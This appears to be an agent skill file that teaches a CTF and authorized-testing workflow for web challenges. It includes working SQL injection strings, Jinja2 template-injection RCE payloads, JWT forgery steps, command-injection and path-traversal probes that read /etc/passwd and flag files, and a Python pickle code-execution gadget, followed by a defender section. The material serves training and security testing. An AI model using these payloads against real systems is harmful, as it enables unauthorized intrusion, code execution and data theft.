---
name: ctf-web-challenges
description: Use when competing in a CTF web challenge, practicing in a
  lab, or testing a web application you are authorized to test. Covers the
  web challenge workflow, mapping routes and inputs, reading client-side
  JavaScript for hidden endpoints, exploiting SQL injection, server-side
  template injection, JWT weaknesses, command injection, file inclusion,
  and insecure deserialization to capture flags. Use when a challenge
  gives you a URL, when source code is provided for a web app, or when you
  need a systematic path from recon to flag in an authorized setting.
version: 1.0.0
domain: ctf
lifecycle: stable
last_verified: "2026-10-23"
requires: []
extends: []
relates: [web-sqli, ctf-crypto-challenges]
tools:
  - name: Burp Suite
    version: "2026.2"
  - name: Python
    version: "3.12"
  - name: curl
    version: "8.5"
  - name: sqlmap
    version: 1.9.2
  - name: Node.js
    version: "22.11"
---

Web challenges give you a URL (and often source code) and a flag hidden
behind a vulnerability. The winning pattern is systematic: map the
application, read every piece of client-side code and provided source,
identify the vulnerability class, exploit it minimally to prove impact,
then escalate to flag retrieval. This skill covers the authorized
methodology across the most common CTF web bug classes, with concrete
payloads and the order of operations that wastes the least time. Scope is
CTF competitions, lab apps, and systems you have explicit permission to
test.

## Quick Workflow

1. Recon the app: visit every route, note forms, parameters, cookies,
   and JavaScript files; run a light directory scan for hidden paths.
2. Read all provided source code first; CTF web challenges are usually
   solved from source, not black box.
3. Read client-side JavaScript for API endpoints, hardcoded secrets, and
   commented-out routes.
4. Classify the bug: SQLi, SSTI, JWT, command injection, LFI/RFI,
   deserialization, or logic flaw, based on source patterns.
5. Reproduce locally if source is provided (docker compose up) so you
   can iterate fast without rate limits.
6. Exploit minimally: prove the primitive (a sleep, a reflected value,
   a decoded token) before going for the flag.
7. Escalate to flag retrieval: read `flag.txt`, dump the database, or
   achieve code execution as the challenge allows.
8. Record the exact requests (Burp history or curl) so the writeup is
   reproducible.

## 1. Recon and source review

```bash
# Fetch and inventory
curl -s http://chals.ctf:8000/ | head -50
curl -s http://chals.ctf:8000/robots.txt
curl -s http://chals.ctf:8000/static/app.js | grep -n -i -E "fetch|api|/admin|secret|token" | head -20

# Light directory scan (authorized scope only, low threads)
# use your preferred wordlist; keep it quiet on shared CTF infra
```

Source review checklist (when source is given):

- `app.py` / `index.js`: route handlers, especially ones reading files
  or building queries from request input.
- Template rendering: `render_template_string(` with user input is the
  SSTI signature.
- JWT code: look for `algorithms=["none"]`, hardcoded secrets, or
  `verify_signature=False`.
- Database calls: string-concatenated SQL is the SQLi signature.
- `os.system`, `subprocess`, `eval`, `pickle.loads` on user input:
  command injection or deserialization.
- File reads: `open(os.path.join(base, request.args['f']))` is path
  traversal bait.

## 2. SQL injection in CTF web apps

CTF SQLi is usually login bypass or data extraction, often with the flag
in the database.

```bash
# Login bypass probes (try in order)
admin' --
admin' OR '1'='1' --
' OR 1=1 --
admin' OR 1=1-- -

# UNION extraction once a visible column is found
' UNION SELECT 1,2,3-- -
' UNION SELECT 1,group_concat(table_name),3 FROM information_schema.tables-- -
' UNION SELECT 1,group_concat(column_name),3 FROM information_schema.columns WHERE table_name='flags'-- -
' UNION SELECT 1,flag,3 FROM flags-- -
```

For blind cases, script boolean extraction in Python (see the web-sqli
skill for the full loop). In CTFs, `sqlmap --batch -u <url>` with the
captured request often finishes the job in seconds; save manual work for
WAF-filtered cases.

## 3. Server-side template injection (SSTI)

If user input is rendered by a template engine, inject template syntax to
reach code execution.

```bash
# Detection: does the app evaluate {{7*7}}?
curl -s -X POST http://chals.ctf:8000/greet -d 'name={{7*7}}'
# response contains "49" -> SSTI confirmed (Jinja2/Twig style)

# Jinja2 (Python) exploitation ladder
{{ self.__init__.__globals__.__builtins__ }}          # recon: what is reachable
{{ cycler.__init__.__globals__.os.popen('id').read() }}  # RCE via known subclasses
{{ namespace.__init__.__globals__.os.popen('cat /flag*').read() }}
```

Full Jinja2 RCE payload (subclass traversal):

```
{{ ''.__class__.__mro__[1].__subclasses__()[139].__init__.__globals__['os'].popen('cat /flag.txt').read() }}
```

The subclass index varies per Python build; enumerate locally with the
same Python version:

```python
# find a usable subclass index locally
subs = ''.__class__.__mro__[1].__subclasses__()
for i, c in enumerate(subs):
    if 'os' in getattr(getattr(c, '__init__', None), '__globals__', {}):
        print(i, c)
```

Twig (PHP) variant: `{{_self.env.setCache("ftp://...")}}` style payloads
differ; identify the engine from error messages or source first.

## 4. JWT weaknesses

CTF JWT challenges recycle a short list of misconfigurations.

```bash
# Decode without verifying (header.payload are base64url JSON)
python3 -c "
import base64, json
tok = 'eyJhbGciOi...'.split('.')
print(json.loads(base64.urlsafe_b64decode(tok[0] + '==')))
print(json.loads(base64.urlsafe_b64decode(tok[1] + '==')))
"
```

Attack ladder:

1. `alg: none`: strip the signature, set `"alg":"none"`, change
   `"role":"admin"`.
2. Weak secret: brute force with a wordlist (`jwt_tool`, hashcat mode
   16500, or John); secrets like `secret`, `password`, `ctf` are common.
3. `kid` SQLi or path traversal: if `kid` selects the key from a DB or
   file, inject there.
4. Algorithm confusion (RS256 -> HS256): sign with the RSA public key
   as HMAC secret when the app mishandles key types.
5. `jwk`/`jku` header injection: embed your own key when the app trusts
   the token's key parameters.

```bash
# jwt_tool quick checks (install from your tools dir)
python3 jwt_tool.py <token> -C -d /usr/share/wordlists/rockyou.txt
python3 jwt_tool.py <token> -X s -pk pubkey.pem   # alg confusion probe
```

## 5. Command injection and file inclusion

```bash
# Command injection probes (in order of subtlety)
;id
$(id)
`id`
|id
&& id

# If output is reflected, escalate:
;cat /flag* /flag.txt /app/flag*

# LFI probes
../../../../etc/passwd
....//....//....//etc/passwd
/etc/passwd%00   # null byte (old PHP)
/proc/self/environ (log poisoning path when logs are readable)
```

PHP wrappers when `allow_url_include` is on: `php://filter/convert.base64-encode/resource=index.php`
reads source as base64. Python path traversal: `..%2f..%2f` encoding
variants when a naive filter strips `../`.

## 6. Insecure deserialization (Python pickle / PHP / Node)

```python
# Python pickle RCE gadget (when the app unpickles user input, e.g. a cookie)
import pickle, base64, os
class RCE:
    def __reduce__(self):
        return (os.system, ("cat /flag.txt > /tmp/o",))
print(base64.b64encode(pickle.dumps(RCE())).decode())
```

Set the resulting base64 as the cookie value the app unpickles, then read
`/tmp/o` through whatever file-read primitive exists (or use a reverse
shell if egress is allowed by the challenge network). Node
`node-serialize` and PHP `unserialize` have their own gadget chains; the
pattern is identical: find the sink, craft the payload, trigger it.

## Edge cases

- The app is behind a WAF that blocks obvious payloads: encode
  (`${7*7}` vs `{{7*7}}` for SSTI), use alternative syntax, or find the
  filter in source and bypass it precisely.
- Rate limiting on login forms: slow the brute force, or the intended
  path is SQLi bypass, not credential guessing.
- Flag is not at `/flag.txt`: enumerate with `ls /`, `find / -name
  "*flag*"`, or check environment variables (`env`) and the database.
- The challenge resets per connection: do recon once, script the full
  exploit, and run it end to end in one go.
- Source shows a framework you do not know: search its docs for the
  dangerous defaults (template autoescape off, JWT verify off) rather
  than guessing payloads.

## Escalation

- SSTI gives output but no RCE: the sandbox may block attribute
  access; try alternative gadget paths (`cycler`, `joiner`,
  `namespace`) or read files via `__class__` loaders instead of `os`.
- SQLi is blind and slow: check for an easier bug first; CTF authors
  rarely intend a 10,000 request blind extraction when SSTI is also
  present.
- JWT secret brute force fails: move down the ladder (kid injection,
  jku) instead of burning hours on rockyou.
- RCE achieved but no flag file: the flag may be in an environment
  variable, a database, or a second container; enumerate from the shell.
- Everything looks patched: re-read the source for logic flaws
  (price manipulation, IDOR on `/user/<id>`, admin routes without
  checks); some web challenges are pure logic.

## Detection and defender view

Defenders see web exploitation as payloads in access logs: `{{`, `${`,
`UNION SELECT`, `../`, `${jndi:`, and base64 blobs in cookies, plus
scanner-like bursts from one IP. A WAF blocks the noisy variants but
misses encoded ones, so defenders also monitor for the outcomes: new
processes spawned by the web user, unexpected file reads (`/flag*`,
`/etc/passwd`), and database query anomalies. Durable fixes: parameterized
queries, template autoescape with no user input in template strings,
strict JWT validation (explicit allowlisted algorithms, strong secrets),
and never passing user input to shells or deserializers.

## Key references

- MITRE ATT&CK T1190 (Exploit Public-Facing Application).
- CWE-89 (SQL Injection), CWE-94 (Code Injection), CWE-918-adjacent
  template injection patterns, CWE-22 (Path Traversal).
- CWE-287 (Improper Authentication): JWT validation failures.
- CWE-502 (Deserialization of Untrusted Data).
- PortSwigger Web Security Academy: https://portswigger.net/web-security
- OWASP Testing Guide v4: https://owasp.org/www-project-web-security-testing-guide/
- HackTricks web section: https://book.hacktricks.xyz/pentesting-web

## See also

- `webapp-pentest-methodology`: Use it instead for a full client web pentest, with scoping, rules of engagement, and reporting, rather than a competition workflow.
